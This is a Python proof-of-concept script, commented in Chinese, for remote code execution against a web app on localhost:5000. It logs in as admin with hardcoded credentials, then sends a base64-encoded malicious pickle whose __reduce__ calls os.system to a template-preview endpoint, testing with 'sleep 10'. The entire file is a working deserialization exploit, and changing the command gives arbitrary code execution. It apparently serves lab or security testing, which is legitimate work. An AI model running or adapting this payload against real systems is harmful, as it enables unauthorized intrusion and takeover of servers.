#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
简单的RCE测试脚本
"""

import requests
import pickle
import base64
import subprocess

class RCEPayload:
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        import os
        return (os.system, (self.command,))

def test_rce():
    # 目标URL
    target_url = "http://localhost:5000"
    session = requests.Session()
    
    print("=== 简单RCE测试 ===")
    
    # 1. 登录
    print("[+] 正在登录...")
    login_data = {'username': 'admin', 'password': 'admin@2024'}
    response = session.post(f"{target_url}/login", data=login_data)
    
    if "仪表板" in response.text:
        print("[+] 登录成功")
    else:
        print("[-] 登录失败")
        return False
    
    # 2. 测试简单命令
    print("[+] 测试RCE...")
    
    # 创建一个简单的测试命令
    test_command = "sleep 10"
    
    # 生成payload
    payload_obj = RCEPayload(test_command)
    pickled = pickle.dumps(payload_obj)
    encoded = base64.b64encode(pickled).decode('utf-8')
    
    # 构造请求
    attack_data = {
        "content": "测试模板 {{test}}",
        "variables": f"pickle:{encoded}"
    }
    print(attack_data)
    
    print(f"[+] 发送payload: {test_command}")
    response = session.post(
        f"{target_url}/admin/templates/preview",
        json=attack_data,
        headers={'Content-Type': 'application/json'}
    )
    
    print(f"[+] 响应状态码: {response.status_code}")
    if response.status_code == 200:
        try:
            result = response.json()
            print(f"[+] 响应内容: {result}")
            if result.get('success'):
                print("[+] ✅ RCE攻击成功！")
                return True
            else:
                print(f"[-] 攻击失败: {result.get('error')}")
        except Exception as e:
            print(f"[-] 解析响应失败: {e}")
            print(f"响应内容: {response.text}")
    else:
        print(f"[-] HTTP错误: {response.status_code}")
        print(f"响应内容: {response.text}")
    
    return False

if __name__ == "__main__":
    try:
        test_rce()
    except Exception as e:
        print(f"测试过程中发生错误: {e}")
        import traceback
        traceback.print_exc() 